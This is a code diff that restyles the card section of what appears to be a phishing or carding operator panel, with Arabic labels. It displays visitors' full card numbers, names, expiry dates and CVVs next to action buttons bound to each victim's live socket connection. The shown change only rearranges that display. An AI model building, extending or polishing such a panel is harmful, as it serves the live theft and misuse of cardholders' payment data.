@@ -2013,7 +2013,18 @@
               // Credit card display (original)
               html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
               html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقة دفع</h3>';
-              var _cf = String(card.cardNumber || '');
+              html += '<div class="bg-gradient-to-r from-purple-100 to-blue-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
+              html += '<div class="flex items-center gap-2">';
+              html += '<span class="text-purple-700 font-bold text-lg">🏦 ' + cardInfo.bank + '</span>';
+              html += '<span class="px-2 py-1 rounded text-xs font-bold ' + (cardInfo.type === 'Credit' ? 'bg-blue-500 text-white' : 'bg-green-500 text-white') + '">' + cardInfo.type + '</span>';
+              html += '</div>';
+              html += '<div class="flex items-center gap-2">';
+              html += '<span class="px-2 py-1 rounded text-xs font-bold bg-yellow-400 text-yellow-900">' + cardInfo.tier + '</span>';
+              html += '<span class="text-gray-600 text-sm">' + cardInfo.network + '</span>';
+              html += '</div>';
+              html += '</div>';
+              html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
+              var _cf = String(card.cardNumber || '').replace(/\D/g, '');
               var _cp = _cf.match(/.{1,4}/g);
               var _cn = _cp ? _cp.join(' ') : _cf;
               var _cb = String(cardInfo.bank || '');
@@ -2028,23 +2039,6 @@
               html += '<div><div class="kc-lab">CVV</div><span class="kc-cvv">' + (card.cvv || '---') + '</span></div>';
               html += '<div class="kc-right"><div class="kc-brand">' + (cardInfo.network || 'CARD') + '</div><div class="kc-tier">' + (cardInfo.type || '') + ' • ' + (cardInfo.tier || '') + '</div></div>';
               html += '</div></div></div>';
-              html += '<div class="bg-gradient-to-r from-purple-100 to-blue-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
-              html += '<div class="flex items-center gap-2">';
-              html += '<span class="text-purple-700 font-bold text-lg">🏦 ' + cardInfo.bank + '</span>';
-              html += '<span class="px-2 py-1 rounded text-xs font-bold ' + (cardInfo.type === 'Credit' ? 'bg-blue-500 text-white' : 'bg-green-500 text-white') + '">' + cardInfo.type + '</span>';
-              html += '</div>';
-              html += '<div class="flex items-center gap-2">';
-              html += '<span class="px-2 py-1 rounded text-xs font-bold bg-yellow-400 text-yellow-900">' + cardInfo.tier + '</span>';
-              html += '<span class="text-gray-600 text-sm">' + cardInfo.network + '</span>';
-              html += '</div>';
-              html += '</div>';
-              html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
-              html += '<div class="grid grid-cols-2 gap-4 text-base">';
-              html += '<div class="text-right"><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold text-lg" dir="ltr" style="unicode-bidi: embed; display: inline-block;">' + (card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '') + '</span></div>';
-              html += '<div class="text-left"><span class="text-gray-500">الاسم:</span> <span class="font-medium text-lg">' + card.nameOnCard + '</span></div>';
-              html += '<div class="text-right"><span class="text-gray-500">الانتهاء:</span> <span class="font-medium text-lg">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
-              html += '<div class="text-left"><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold text-lg">' + card.cvv + '</span></div>';
-              html += '</div>';
               // Action buttons for credit card
               html += '<div class="flex gap-2 mt-3">';
               html += '<button onclick="cardActionApp(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق</button>';
